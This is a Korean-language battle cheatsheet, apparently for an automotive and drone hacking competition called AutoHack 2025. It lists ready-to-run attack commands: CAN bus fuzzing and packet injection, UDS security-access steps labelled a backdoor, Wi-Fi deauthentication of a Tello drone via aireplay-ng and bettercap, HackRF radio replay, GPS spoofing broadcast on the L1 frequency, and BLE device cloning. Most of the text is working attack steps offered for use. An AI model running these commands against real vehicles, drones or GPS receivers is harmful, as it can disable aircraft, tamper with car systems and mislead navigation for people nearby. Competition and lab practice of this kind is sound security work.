# ⚡ AutoHack 2025 Battle Cheatsheet

## 0\. 🚀 [0순위] 현장 도착 직후 (Setup)

### 가상환경 및 라이브러리

```bash
# 가상환경 활성화
source ~/AutoHack/2025_AutoHack_Tool-kit/auto_env/bin/activate

# 꼬였을 때 패키지 강제 재설치
pip install --force-reinstall -r requirements.txt
```

### 인터페이스 활성화

```bash
# [CAN] 라즈베리파이 CAN Hat (500k)
sudo ip link set can0 up type can bitrate 500000
# 상태 확인
ip -details link show can0

# [RF] Bluetooth 리셋
sudo hciconfig hci0 down && sudo hciconfig hci0 up

# [Network] IP 확인 (라즈베리파이 찾기)
arp -a
```

-----

## 🚗 1. CAN Bus Hacking

### CLI 한 줄 명령어 (Quick Wins)

```bash
# 1. 특정 ID만 보기 (필터링)
candump can0,0x123:0x7FF

# 2. 로그 파일로 저장
candump -l can0

# 3. 랜덤 데이터 주입 (Fuzzing) - ID 0x123에 8바이트 랜덤
cangen can0 -I 123 -L 8 -D r -v

# 4. 특정 패킷 1회 전송
cansend can0 123#DEADBEEF
```

### UDS 진단 (Backdoor)

  * **세션 확장:** `0x10 0x03` (Extended Session)
  * **시드 요청:** `0x27 0x01` (Security Access)
  * **데이터 읽기:** `0x23` + `Address` + `Size`
  * **테스터 유지 (Heartbeat):** `0x3E 0x00` (2초마다 전송 필수)

-----

## 📡 2. RF & Drone (HackRF/Tello)

### Tello 드론 (Wi-Fi)

1.  **연결:** 노트북 Wi-Fi -\> `TELLO-XXXXXX` 접속
2.  **공격 (Deauth):**
    ```bash
    # 드론 BSSID 확인
    sudo airodump-ng wlan0
    # 연결 해제 공격 (무한)
    sudo aireplay-ng -0 0 -a [DRONE_MAC] wlan0
    ```

### HackRF (Jamming/GPS)

```bash
# 1. [Replay] 신호 녹화 (2MHz 대역폭, 샘플링 8M)
hackrf_transfer -r my_signal.iq -f 433920000 -s 8000000

# 2. [Replay] 신호 전송 (증폭 켜기)
hackrf_transfer -t my_signal.iq -f 433920000 -s 8000000 -a 1 -x 47

# 3. [GPS Spoofing] (평양 좌표 예시)
./gps-sdr-sim -e brdc_file -l 39.0,125.7,100 -b 8 -o fake_gps.bin
hackrf_transfer -t fake_gps.bin -f 1575420000 -s 2600000 -a 1 -x 40
```

-----

## 🛠️ 3. Bettercap (만능툴)

```bash
# 실행 (웹 UI)
bettercap -eval "ui.update; caplets.update; http-ui"

# [BLE] 주변 장치 복제 (Spoofing)
ble.recon on
ble.adv.clone [TARGET_MAC]

# [Wi-Fi] 드론 죽이기
wifi.recon on
wifi.deauth [TELLO_MAC]
```
